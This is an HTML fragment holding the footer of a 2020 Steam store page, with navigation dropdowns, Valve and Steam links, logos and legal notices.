				</div>
			</div>
		</div>
		<!-- End Right Column -->
	
	<div style="clear: both;"></div>

</div>
<!-- End Main Background -->

		</div>	<!-- responsive_page_legacy_content -->

		<div id="footer_spacer" style="" class=""></div>
<div id="footer"  class="">
<div class="footer_content">
	<div class="rule"></div>

	<div id="footer_nav">

		
		
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_steam_pulldown">
				<span>ABOUT STEAM</span>
			</span>
		<div class="popup_block_new" id="footer_steam_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://store.steampowered.com/about/?snr=1_44_44__22">
					What is Steam?				</a>
				<!--
					<a class="popup_menu_item" href="https://store.steampowered.com/login/">
						Download Steam now					</a>
					-->
				<a class="popup_menu_item" href="https://support.steampowered.com/kb_article.php?p_faqid=549#gifts" target="_blank" rel="noreferrer">
					Gifting on Steam				</a>
				<a class="popup_menu_item" href="https://steamcommunity.com/?snr=1_44_44__22">
					The Steam Community				</a>
			</div>
					</div>
	
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_valve_pulldown">
				<span>ABOUT VALVE</span>
			</span>
		<div class="popup_block_new" id="footer_valve_dropdown" style="display: none;">
			<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="http://www.valvesoftware.com/about.html" target="_blank" rel="noreferrer">
					About Valve				</a>
				<a class="popup_menu_item" href="http://www.valvesoftware.com/business/" target="_blank" rel="noreferrer">
					Business Solutions				</a>
				<a class="popup_menu_item" href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">
					Steamworks				</a>
				<a class="popup_menu_item" href="http://www.valvesoftware.com/jobs.html" target="_blank" rel="noreferrer">
					Jobs				</a>
			</div>
		</div>
			
			
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_help_pulldown">
				<span>HELP</span>
			</span>
		<div class="popup_block_new" id="footer_help_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://help.steampowered.com/en/?snr=1_44_44__23">
					Support				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/forums/?snr=1_44_44__23" target="_blank" rel="noreferrer">
					Forums				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/stats/?snr=1_44_44__23" target="_blank" rel="noreferrer">
					Stats				</a>
			</div>
					</div>

			
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_feeds_pulldown">
				<span>NEWS FEEDS</span>
			</span>
		<div class="popup_block_new" id="footer_feeds_dropdown" style="display: none;">
			<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/news.xml">
					<img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Steam News				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/newreleases.xml">
					<img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Game Releases				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/daily_deals.xml">
					<img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Daily Deals				</a>
			</div>
		</div>
		<div style="clear: left;"></div>

	</div>

	<br>

    <div class="rule"></div>
				<div id="footer_logo_steam"><img src="https://steamstore-a.akamaihd.net/public/images/v6/logo_steam_footer.png" alt="Valve Software" border="0" /></div>
	
    <div id="footer_logo"><a href="http://www.valvesoftware.com" target="_blank" rel="noreferrer"><img src="https://steamstore-a.akamaihd.net/public/images/footerLogo_valve_new.png" alt="Valve Software" border="0" /></a></div>
    <div id="footer_text">
        <div>&copy; 2020 Valve Corporation.  All rights reserved.  All trademarks are property of their respective owners in the US and other countries.</div>
        <div>VAT included in all prices where applicable.&nbsp;&nbsp;

            <a href="https://store.steampowered.com/privacy_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Privacy Policy</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/legal/?snr=1_44_44_" target="_blank" rel="noreferrer">Legal</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/subscriber_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Steam Subscriber Agreement</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/steam_refunds/?snr=1_44_44_" target="_blank" rel="noreferrer">Refunds</a>

        </div>
					<div class="responsive_optin_link">
				<div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
					<span>View mobile website</span>
				</div>
			</div>
		
    </div>



    <div style="clear: left;"></div>
	<br>

    <div class="rule"></div>

    <div class="valve_links">
        <a href="http://www.valvesoftware.com/about.html" target="_blank" rel="noreferrer">About Valve</a>
        &nbsp; | &nbsp;<a href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">Steamworks</a>
        &nbsp; | &nbsp;<a href="http://www.valvesoftware.com/jobs.html" target="_blank" rel="noreferrer">Jobs</a>
        &nbsp; | &nbsp;<a href="https://partner.steamgames.com/steamdirect" target="_blank" rel="noreferrer">Steam Distribution</a>
        		&nbsp; | &nbsp;<a href="https://store.steampowered.com/digitalgiftcards/?snr=1_44_44_" target="_blank" rel="noreferrer">Gift Cards</a>
		&nbsp; | &nbsp;<a href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam" target="_blank" rel="noopener"><img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_facebook.gif"> Steam</a>
		&nbsp; | &nbsp;<a href="http://twitter.com/steam" target="_blank" rel="noreferrer"><img src="https://steamstore-a.akamaihd.net/public/images/ico/ico_twitter.gif"> @steam</a>
            </div>

</div>
</div>
	</div>	<!-- responsive_page_content -->

</div>	<!-- responsive_page_frame -->
</body>
</html>
`
